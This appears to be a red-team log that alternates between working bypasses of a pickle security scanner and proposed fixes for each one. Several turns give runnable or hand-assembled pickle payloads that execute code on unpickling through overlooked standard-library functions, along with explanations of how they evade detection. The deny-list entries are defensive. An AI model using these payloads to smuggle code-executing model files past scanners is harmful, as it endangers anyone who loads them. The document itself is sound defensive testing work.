# Picklescan RCE Bypass Game

## Turn 1 - `mailcap.findmatch` policy gap

Goal: produce an RCE-capable pickle that `packages/modelaudit-picklescan`
does not flag.

Payload shape:

```python
import mailcap


class MailcapFindmatchRce:
    def __reduce__(self):
        caps = {
            "text/plain": [
                {
                    "view": "cat %s",
                    "test": "touch /tmp/modelaudit_mailcap_findmatch_rce_marker",
                }
            ]
        }
        return (mailcap.findmatch, (caps, "text/plain", "view", "/tmp/modelaudit-safe-input", []))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/modelaudit_mailcap_findmatch_rce_marker`
- RCE mechanism: `mailcap.findmatch()` evaluates the attacker-controlled
  mailcap `test` command with `os.system()` before returning a viewer command.

Performance note: this is a policy-table miss, not an opcode-analysis miss.
Blocking it should be a constant-time lookup change in `policy.rs` plus a
regression in the adversarial oracle corpus.

## Turn 2 - Block `mailcap.findmatch`

Blocking plan:

- Add `("mailcap", "findmatch")` to the sorted dangerous-global table.
- Add policy coverage so raw `GLOBAL mailcap findmatch` reductions are
  classified as malicious even on Python versions where `mailcap` has been
  removed.
- Add a CPython oracle regression that builds the exact marker-file payload on
  Python versions with `mailcap` and verifies both scanner detection and
  runtime execution.

Performance note: the fix preserves the existing `binary_search_by()` lookup
path and adds one table entry, so hot-path cost remains O(log n) with no extra
payload scanning.

## Turn 3 - `setuptools._distutils.spawn.spawn` namespace gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import setuptools._distutils.spawn as dist_spawn


class SetuptoolsDistutilsSpawnRce:
    def __reduce__(self):
        return (dist_spawn.spawn, (["/usr/bin/touch", "/tmp/ma_sdu_marker"],))
```

Proof with CPython 3.12.12 plus `setuptools` installed:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_sdu_marker`
- RCE mechanism: `setuptools._distutils.spawn.spawn()` directly calls
  `subprocess.check_call(cmd, ...)` with an attacker-controlled command list.

Why the scanner missed it:

- The policy wildcards `distutils`, but Python packaging environments commonly
  expose the compatibility namespace `setuptools._distutils`.
- `global_severity()` checks exact wildcard modules and the top-level module
  only, so `setuptools._distutils.spawn.spawn` does not inherit the existing
  `distutils` wildcard.

Performance note: this is another policy-table miss. The narrow next block is a
sorted `DANGEROUS_GLOBALS` entry for
`("setuptools._distutils.spawn", "spawn")`, which preserves the existing
O(log n) lookup and avoids broad `setuptools` false positives.

## Turn 4 - Block `setuptools._distutils.spawn.spawn`

Blocking plan:

- Add `("setuptools._distutils.spawn", "spawn")` to the sorted
  dangerous-global table instead of wildcarding all `setuptools`.
- Add portable policy coverage for raw `GLOBAL setuptools._distutils.spawn
  spawn` reductions so detection does not depend on `setuptools` being
  installed in the test environment.
- Add an optional CPython oracle regression that imports
  `setuptools._distutils.spawn` when available, verifies scanner detection, then
  verifies runtime marker-file execution.

Performance note: the block is a single additional binary-search entry. It does
not add any module-prefix expansion or extra payload walking.

## Turn 5 - `pipes.Template.copy` pipeline execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import pipes


class PipesTemplateCopyRce:
    def __reduce__(self):
        template = pipes.Template()
        template.append("touch /tmp/ma_pipes_marker; cat $IN > $OUT", "ff")
        return (pipes.Template.copy, (template, "/dev/null", "/tmp/ma_pipes_out"))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_pipes_marker` and
  `/tmp/ma_pipes_out`
- RCE mechanism: `pipes.Template.copy()` calls
  `os.system(self.makepipeline(infile, outfile))`; the pickled `Template`
  instance carries attacker-controlled `steps`, so the final pipeline is
  attacker-controlled shell syntax.

Why the scanner missed it:

- `pipes` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The callable is reached as the dotted global `pipes.Template.copy`; protocol
  4 dotted-name resolution avoids any separately flagged helper such as
  `builtins.getattr`.
- The command string can avoid existing suspicious string literals such as
  `os.system`, `subprocess`, or `eval`.

Performance note: this is a policy coverage gap. The exact scanner key for the
proof is `("pipes", "Template.copy")`, because protocol 4 dotted globals keep
the module as `pipes` and the attribute path as `Template.copy`.

## Turn 6 - Block `pipes.Template` pipeline methods

Blocking plan:

- Add explicit dangerous-global entries for `pipes.Template.copy`,
  `pipes.Template.open`, `pipes.Template.open_r`, and `pipes.Template.open_w`.
  These methods all execute pipeline commands via `os.system()` or `os.popen()`
  when a pickled `Template` carries attacker-controlled `steps`.
- Add portable policy coverage for all four raw global reductions so detection
  does not depend on the deprecated `pipes` module being available.
- Add an optional CPython oracle regression for the proven
  `pipes.Template.copy` marker-file payload when `pipes` is available.

Performance note: the block adds four sorted binary-search entries and no new
payload scanning or module-prefix expansion.

## Turn 7 - `typing._eval_type` / `ForwardRef` eval gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


payload = b"".join(
    [
        b"\x80\x04",
        s("typing"),
        s("_eval_type"),
        b"\x93",
        s("typing"),
        s("ForwardRef"),
        b"\x93",
        s("f(p) or int"),
        b"\x85R",
        b"}",
        s("f"),
        s("pathlib"),
        s("Path.touch"),
        b"\x93s",
        s("p"),
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_typing_eval_type_marker"),
        b"tRs",
        s("int"),
        s("builtins"),
        s("int"),
        b"\x93s",
        b"N\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_typing_eval_type_marker` and returns
  `<class 'int'>`
- RCE mechanism: `typing._eval_type()` evaluates `ForwardRef` expressions via
  Python `eval()`. The pickle constructs `typing.ForwardRef("f(p) or int")`
  during unpickling, supplies attacker-controlled globals where `f` is
  `pathlib.Path.touch` and `p` is a `Path`, then calls `_eval_type`.

Why the scanner missed it:

- `typing` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals:
  `typing._eval_type`, `typing.ForwardRef`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `builtins.int`.
- The evaluated string is intentionally bland (`f(p) or int`) and does not
  contain existing suspicious string patterns such as `os.system`,
  `subprocess`, `eval`, `exec`, or `__import__`.

Performance note: this is a policy coverage gap around a direct eval sink. The
narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("typing", "_eval_type")`, with an oracle regression that manually assembles
the pickle so no unpickle-time `ForwardRef` code object has to be serialized.

## Turn 8 - Block `typing._eval_type`

Blocking plan:

- Add `("typing", "_eval_type")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL typing _eval_type` reductions.
- Add a CPython oracle regression that manually builds the
  `ForwardRef("f(p) or int")` payload, verifies scanner detection, then verifies
  marker-file execution during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add expression parsing, string scanning, or special handling for typing
objects.

## Turn 9 - `dataclasses._create_fn` generated-source exec gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import dataclasses
import pickle


class DataclassesCreateFnRce:
    def __reduce__(self):
        return (
            dataclasses._create_fn,
            (
                "x",
                ["a=open('/tmp/ma_dataclasses_create_fn_marker','w').write('x')"],
                ["return int"],
            ),
        )


payload = pickle.dumps(DataclassesCreateFnRce(), protocol=4)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_dataclasses_create_fn_marker` and returns a
  generated function named `x`
- RCE mechanism: `dataclasses._create_fn()` builds Python source from the
  supplied `name`, `args`, and `body`, then calls `exec(txt, globals, ns)`.
  The payload places the side effect in a default argument expression, so it
  executes while the generated inner function is defined during unpickling.

Why the scanner missed it:

- `dataclasses` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The only import reference is `dataclasses._create_fn`, and it is recorded as
  `is_dangerous=False`.
- The generated-source string avoids current suspicious string seeds such as
  `eval(`, `exec(`, `__import__`, `os.system`, and `subprocess`.

Performance note: this is another direct policy coverage gap around an exec
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("dataclasses", "_create_fn")`, plus a regression that proves scan-time
detection before unpickle-time marker creation.

## Turn 10 - Block `dataclasses._create_fn`

Blocking plan:

- Add `("dataclasses", "_create_fn")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL dataclasses _create_fn`
  reductions.
- Add a CPython oracle regression that pickles a default-argument side effect,
  verifies scanner detection, then verifies the marker file appears only during
  unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add generated-source parsing or broader string scanning.

## Turn 11 - `typing.get_type_hints` annotation eval gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_typing_get_type_hints_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("typing"),
        s("get_type_hints"),
        b"\x93",
        s("builtins"),
        s("type"),
        b"\x93",
        s("C"),
        b")",
        b"}",
        s("__annotations__"),
        b"}",
        s("x"),
        s("f(p) or int"),
        b"s",
        b"s",
        b"\x87R",
        b"}",
        s("f"),
        s("pathlib"),
        s("Path.touch"),
        b"\x93s",
        s("p"),
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_typing_get_type_hints_marker"),
        b"tRs",
        s("int"),
        s("builtins"),
        s("int"),
        b"\x93s",
        b"N\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_typing_get_type_hints_marker` and returns
  `{"x": <class 'int'>}`
- RCE mechanism: the pickle first builds
  `type("C", (), {"__annotations__": {"x": "f(p) or int"}})` using
  `builtins.type`, then calls
  `typing.get_type_hints(C, {"f": pathlib.Path.touch, "p": marker, "int": int}, None)`.
  `get_type_hints()` evaluates string annotations with the supplied globals, so
  the bland annotation expression touches the marker during unpickling.

Why the scanner missed it:

- `typing.get_type_hints` is absent from `DANGEROUS_GLOBALS`, and `typing` is
  not a wildcard-dangerous module.
- The payload uses only currently clean globals:
  `typing.get_type_hints`, `builtins.type`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `builtins.int`.
- The evaluated annotation string is intentionally bland (`f(p) or int`) and
  does not contain current suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a policy coverage gap around a public annotation eval
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("typing", "get_type_hints")`, plus a manual-pickle oracle regression that
asserts scan-time detection before unpickle-time marker creation.

## Turn 12 - Block `typing.get_type_hints`

Blocking plan:

- Add `("typing", "get_type_hints")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL typing get_type_hints`
  reductions.
- Add a CPython oracle regression that manually builds the annotated class and
  supplied globals, verifies scanner detection, then verifies the marker file
  appears only during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add annotation parsing, source parsing, or broader string scanning.

## Turn 13 - `operator.call` public-alias invocation gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_operator_call_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("operator"),
        s("call"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_operator_call_marker"),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_operator_call_marker` and returns `None`
- RCE mechanism: `operator.call(func, *args, **kwargs)` invokes its supplied
  callable. The pickle resolves the public `operator.call` alias, supplies the
  currently clean callable `pathlib.Path.touch`, constructs a `Path`, and calls
  it during unpickling. The same sink can invoke attacker-chosen importable
  callables with attacker-controlled arguments.

Why the scanner missed it:

- `_operator` is wildcard-dangerous, so a normal `pickle.dumps(operator.call)`
  payload is detected as `_operator.call`; however, a hand-built
  `GLOBAL operator call` resolves through the public `operator` module.
- `operator.call` is absent from `DANGEROUS_GLOBALS`; only
  `operator.attrgetter`, `operator.itemgetter`, and `operator.methodcaller` are
  listed.
- The payload uses only currently clean globals: `operator.call`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`, with no suspicious string
  seeds such as `eval(`, `exec(`, `__import__`, `os.system`, or `subprocess`.

Performance note: this is a policy alias coverage gap for an arbitrary-call
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("operator", "call")`, plus a manual-pickle oracle regression that proves
scan-time detection before unpickle-time marker creation.

## Turn 14 - Block `operator.call`

Blocking plan:

- Add `("operator", "call")` to the sorted dangerous-global table. The
  `_operator.call` spelling is already covered by the `_operator` wildcard, so
  this closes the public-module alias.
- Add portable policy coverage for raw `GLOBAL operator call` reductions.
- Add a CPython oracle regression that manually builds the public-alias
  `operator.call(pathlib.Path.touch, marker)` pickle, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add callable-flow analysis or any extra string scanning.
